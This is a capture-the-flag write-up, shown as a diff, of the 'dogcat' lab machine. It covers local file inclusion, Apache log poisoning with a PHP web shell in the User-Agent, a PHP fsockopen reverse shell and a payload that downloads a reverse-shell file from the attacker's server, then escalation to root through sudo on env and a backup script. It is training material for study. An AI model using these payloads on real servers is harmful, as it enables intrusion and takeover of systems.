@@ -105,3 +105,130 @@ The answer is using `Apache Log Poisoning`.
 
 `http://10.10.152.133/?view=dog/../../../../../var/log/apache2/access.log&ext=`
 
+
+The below is what we find in the logs
+```
+127.0.0.1 - - [04/Mar/2021:02:58:39 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [04/Mar/2021:02:59:15 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [04/Mar/2021:02:59:57 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [04/Mar/2021:03:00:36 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [04/Mar/2021:03:01:16 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [04/Mar/2021:03:01:56 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 10.8.150.214 - - [04/Mar/2021:03:02:00 +0000] "GET / HTTP/1.1" 200 537 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" 10.8.150.214 - - [04/Mar/2021:03:02:00 +0000] "GET /style.css HTTP/1.1" 200 698 "http://10.10.124.216/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" 10.8.150.214 - - [04/Mar/2021:03:02:01 +0000] "GET /favicon.ico HTTP/1.1" 404 492 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" 10.8.150.214 - - [04/Mar/2021:03:02:14 +0000] "GET /?view=dog/../../../../../var/log/apache2/access.log&ext= HTTP/1.1" 200 775 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" 127.0.0.1 - - [04/Mar/2021:03:02:32 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [04/Mar/2021:03:03:08 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [04/Mar/2021:03:03:43 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [04/Mar/2021:03:04:19 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [04/Mar/2021:03:04:55 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0" 127.0.0.1 - - [04/Mar/2021:03:05:26 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"  
+```
+
+The below is what kind of user-requests looks like (I opened up burpsuite)
+```
+GET /?view=dog/../../../../../var/log/apache2/access.log&ext= HTTP/1.1
+Host: 10.10.124.216
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+```
+
+Lets put the ability to put commands as: `<?php system((isset($_GET['c']))?$_GET['c']:'echo'); ?>:
+
+Thus, using it as: 
+```
+GET /?view=dog&c=php%20-r%20'$sock=fsockopen(%2210.8.150.214%22,4444);exec(%22/bin/sh%20-i%20%3C&3%20%3E&3%202%3E&3%22); HTTP/1.1
+Host: 10.10.124.216
+User-Agent: %3C?php%20system((isset($_GET%5B'c'%5D))?$_GET%5B'c'%5D:'echo');%20?%3E%0A
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+```
+
+It does not work. So, I am going to try another route: upload the reverse shell php file (already present in kali systems) to the server using `curl` and the `-A` flag for setting the user agent. But thats not all, we need to have the file served, so that the curl command curls from our temporary server. I am going to use python3 simple http server for this.
+
+```
+❯ sudo python3 -m http.server 4242
+Serving HTTP on 0.0.0.0 port 4242 (http://0.0.0.0:4242/) ...
+```
+
+The curl did not work for some reason, so I fired up burp again, and this is what I put:
+```
+GET /?view=dog../../../../../var/log/apache2/access.log&ext= HTTP/1.1
+Host: 10.10.8.231
+User-Agent: <?php file_put_contents('phpreverseshell.php',file_get_contents('http://10.8.150.214:4242/phpreverseshell.php'))?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+```
+
+I see get requests, so the payload was successful!
+
+```
+❯ sudo python3 -m http.server 4242
+Serving HTTP on 0.0.0.0 port 4242 (http://0.0.0.0:4242/) ...
+10.10.8.231 - - [03/Mar/2021 23:55:53] "GET /phpreverseshell.php HTTP/1.0" 200 -
+10.10.8.231 - - [03/Mar/2021 23:56:21] "GET /phpreverseshell.php HTTP/1.0" 200 -
+``` 
+
+Now, lets go to: `http://10.10.8.231/phpreverseshell.php`. And don't forget to setup `nc` as well :P
+
+## Foothold
+```
+$ pwd
+/
+$ whoami
+www-data
+```
+We are in!
+
+```
+$ cat flag2_QMW7JvaY2LvK.txt
+THM{leet}
+$ pwd
+/var/www
+```
+
+
+```
+$ cat flag.php
+<?php
+$flag_1 = "THM{l33t}"
+?>
+$ pwd
+/var/www/html
+```
+
+Looking at the sudo permissions, we have:
+```
+$ sudo -l
+Matching Defaults entries for www-data on f7c1f89308d0:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on f7c1f89308d0:
+    (root) NOPASSWD: /usr/bin/env
+```
+
+Interestingly, the machine name looks like a docker container. As for the permissions, `gtfobins` ftw. Anyways, after successful priv esc, we can get the third flag. 
+
+Looking around, we see an interesting file in `/opt/backup`, which looks like our way out.
+```
+# cat backup.sh
+#!/bin/bash
+tar cf /root/container/backup/backup.tar /root/container
+```
+
+Let's setup `nc` for a second time now, at another port
+```
+❯ nc -lnvp 6969
+listening on [any] 6969 ...
+connect to [10.8.150.214] from (UNKNOWN) [10.10.8.231] 40614
+bash: cannot set terminal process group (3450): Inappropriate ioctl for device
+bash: no job control in this shell
+root@dogcat:~# ls
+ls
+container
+flag4.txt
+root@dogcat:~# cat flag4.txt
+cat flag4.txt                                                   
+THM{PWNED} 
+```
+
+And we are done!
